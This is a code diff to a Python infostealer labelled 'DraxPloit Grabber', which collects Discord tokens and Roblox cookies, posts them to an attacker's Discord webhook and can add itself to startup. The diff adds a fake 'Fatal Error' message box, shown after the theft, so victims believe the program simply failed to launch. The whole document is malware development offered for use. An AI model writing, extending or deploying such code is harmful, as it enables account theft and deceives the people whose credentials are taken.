@@ -5,6 +5,7 @@ import asyncio
 import platform
 import subprocess
 import re
+import ctypes
 
 from discord_webhook import DiscordWebhook,DiscordEmbed
 from typing import Union
@@ -14,6 +15,8 @@ from shutil import copy2
 __config__ = {
     'yourwebhookurl': "%WEBHOOK_HERE%",
     'startup': '%_startup_enabled%',
+    'fakeerror': '%fake_error_enabled%',
+    'fakeerrorcustom': '%fake_error_text%',
 }
 
 def find_tokens(path):
@@ -37,6 +40,8 @@ class Exploit:
         self.log = ""
         self.w3bh00k = self.fetch_conf('yourwebhookurl')
         self.startupexe = self.fetch_conf("startup")
+        self.fakeerror = self.fetch_conf("fakeerror")
+        self.fakeerrorcustom = self.fetch_conf("fakeerrorcustom")
         self.robloxcookies = []
         self.tokens = []
         self.avatarURL = "https://avatars.githubusercontent.com/u/79086740?v=4"
@@ -150,6 +155,13 @@ class Exploit:
 
             data = {"content": message, "username": "DraxPloit Grabber Notifier", "avatar_url": self.avatarURL}
             requests.post(self.w3bh00k, json = data)
+
+    def error_fake(self):
+        if self.fakeerror == "yes":
+            if "fake_error_text" in self.fakeerrorcustom:
+                ctypes.windll.user32.MessageBoxW(None, '"notepad.exe" failed to launch. (Debug output: Notepad_0x827394)', 'Fatal Error', 0)
+            else:
+                ctypes.windll.user32.MessageBoxW(None, f'{self.fakeerrorcustom}', 'Fatal Error', 0)
             
     def credits(self):
         embed = DiscordEmbed(
@@ -194,4 +206,5 @@ if __name__ == "__main__" and platform.system() == "Windows":
     exploit.mainTokenProcess()
 
     exploit.credits()
-    
+
+    exploit.error_fake()
